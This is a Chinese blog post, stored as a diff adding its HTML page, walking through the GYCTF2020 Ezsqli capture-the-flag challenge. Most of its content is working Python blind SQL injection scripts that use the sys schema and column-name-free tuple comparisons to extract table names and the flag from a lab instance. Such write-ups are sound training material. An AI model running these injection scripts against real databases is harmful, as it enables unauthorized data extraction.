@@ -1,0 +1,217 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GYCTF2020Ezsqli - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="考点盲注，无列名注入。一样的尝试构造注入语句之后：
+这里利用了网站的特性，当条件成立的时候返回NU1l,失败的时候，就是V&amp;amp;N
+1234567891011121314151617181920,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">GYCTF2020Ezsqli</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">GYCTF2020Ezsqli</h1>
+        <div class="stuff">
+            <span>十一月 19, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/BUU/" rel="tag">BUU</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h1><p>盲注，无列名注入。一样的尝试构造注入语句之后：</p>
+<p>这里利用了网站的特性，当条件成立的时候返回NU1l,失败的时候，就是V&amp;N</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &quot;id=if(ascii(  substr( database() ,1,1)  )&gt;100,1,2)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stringlist = string.digits + string.ascii_letters</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        sql = <span class="string">&quot;if(ascii(  substr( database() ,&#123;&#125;,1)  )&gt;&#123;&#125;,1,2)#&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;V&amp;N&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>注入得到表名：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givf_grasdpa_pa_pa_pa</span><br></pre></td></tr></table></figure>
+
+<p>之后进一步却很难了，因为我们不知道该怎么查询东西，因为information_schmea被过滤掉了，故只能考虑其他注入，分别尝试对innob和sys库进行注入，挨个尝试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql.innodb_table_stats</span><br><span class="line">sys.schema_auto_increment_columns </span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.x$schema_flattened_keys</span><br></pre></td></tr></table></figure>
+
+<p>构造语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
+
+<p>注入表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql =<span class="string">&quot;if(ascii(  substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()  ),&#123;&#125;,1)  )&gt;&#123;&#125;,1,2)#&quot;</span>.<span class="built_in">format</span>(i, j) <span class="comment"># 数据表</span></span><br></pre></td></tr></table></figure>
+
+<p>得到结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users233333333333333,f1ag_1s_h3r3_hhhhh</span><br></pre></td></tr></table></figure>
+
+<p>但是之后我们因为被过滤了or无法获取自动的名字，只能进行无列名注入的操作了</p>
+<p>首先学习了一波师傅的思路：</p>
+<p>利用ascii位的偏移，在本地进行尝试</p>
+<p><img src="image-20201119145415713.png" alt="image-20201119145415713"></p>
+<p>这里需要注意的是 如果select b &gt;select a，如果select b &gt; select a返回的0</p>
+<p>之后还可以进一步的去构造拼接：</p>
+<p><img src="image-20201119145730124.png" alt="image-20201119145730124"></p>
+<p>那么也就是说我们构造出flag之后一步一步的位移推算即可</p>
+<p>这里贴上师傅的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    res += flag</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">128</span>):</span><br><span class="line">        hexchar = add(flag + <span class="built_in">chr</span>(char))</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="built_in">format</span>(hexchar)</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;id&#x27;</span>:payload&#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += <span class="built_in">chr</span>(char<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>除此之外还有二分法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://63d938da-1fd5-4824-8353-6551eab0f6cb.node3.buuoj.cn/&#x27;</span></span><br><span class="line"><span class="comment">#give_grandpa_pa_pa_pa</span></span><br><span class="line"></span><br><span class="line">payload_flag=<span class="string">&#x27;1^((1,\&#x27;&#123;&#125;\&#x27;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span></span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">132</span></span><br><span class="line">    mid = (low + high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high):</span><br><span class="line">        k = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">        payload = payload_flag.<span class="built_in">format</span>(k)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        print(payload)</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">        mid = (low+high) //<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid ==<span class="number">33</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag +=<span class="built_in">chr</span>(mid<span class="number">-1</span>)</span><br><span class="line">    print(flag.lower())<span class="comment">#因为出来的flag是大写，这边全部转为小写</span></span><br><span class="line">    </span><br><span class="line">print(flag.lower())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%80%83%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">考点</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
